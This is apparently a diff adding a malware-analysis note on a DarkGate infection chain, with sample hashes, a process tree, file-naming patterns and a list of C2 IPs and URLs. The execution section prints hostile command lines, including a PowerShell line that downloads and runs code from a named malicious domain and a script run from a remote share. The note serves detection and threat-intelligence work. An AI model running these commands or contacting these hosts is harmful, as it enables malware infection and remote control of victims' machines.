@@ -1,0 +1,55 @@
+        DarkGate | Admin888 | 2024.03.15
+# --------------------------------------------------------- #
+# ------------------------ SOURCE ------------------------- #
+# --------------------------------------------------------- #
+.xlsx   5c457fbd66768938333b18d2cb22d349b805450f0a9f99a47f73d0f8e9dd86f4
+.vbs    40e92e474faec6da058713b444cf13966cd5d4ebf501fa85db2b08c3a2e4f123
+.ahk    9e794c12cbb367850dafd7e0791f992a0aa96211c373d9404209a89cf1b59f41
+
+# 
+---------------------------------------------------------- #
+# ------------------------ NOTES ------------------------- #
+# -------------------------------------------------------- #
+.xlsx > wscript.exe > powershell.exe > certutil.exe | AutoHotKeys.exe | attrib.exe +h C:/\d{2,4}
+
+.xlsx naming:   \w{3,}-\w{4,6}-\w{3,8}\.xlsx
+.vbs naming:    EXCEL_OPEN_DOCUMENT.vbs
+
+
+# --------------------------------------------------------- #
+# ----------------------- EXECUTION ----------------------- #
+# --------------------------------------------------------- #
+IMAGE: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE
+COMMANDLINE: "C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\Admin\AppData\Local\Temp\ACH-8318-15March.xlsx"
+
+    IMAGE: C:\Windows\System32\WScript.exe
+    COMMANDLINE: "C:\Windows\System32\WScript.exe" "\\147.182.156.154\share\EXCEL_DOCUMENT_OPEN.XLSX.vbs" 
+
+        IMAGE: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        COMMANDLINE: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command Invoke-Expression (Invoke-RestMethod -Uri 'diveupdown.com/uyvbjbho')
+
+            IMAGE: C:\Windows\system32\certutil.exe
+            COMMANDLINE: "C:\Windows\system32\certutil.exe" -decodehex a.bin AutoHotkey.exe
+
+            IMAGE: C:\fpcg\AutoHotkey.exe
+            COMMANDLINE: "C:\fpcg\AutoHotkey.exe" script.ahk 
+
+            IMAGE: C:\Windows\system32\attrib.exe
+            COMMANDLINE: "C:\Windows\system32\attrib.exe" +h C:/fpcg
+
+# --------------------------------------------------------- #
+# -------------------------- C2s -------------------------- #
+# --------------------------------------------------------- #
+64.226.97.86
+172.217.168.234
+167.99.115.33
+147.182.156.154
+http://diveupdown.com/uyvbjbho
+http://diveupdown.com/aa
+http://diveupdown.com/hlsxaifp
+http://diveupdown.com/yhmrmmgc
+http://nextroundst.com/qzaugqmb
+http://nextroundst.com/aa
+http://nextroundst.com/ybzyefqf
+http://nextroundst.com/ytzzvvjo
+http://nextroundst.com/ytzzvvjo
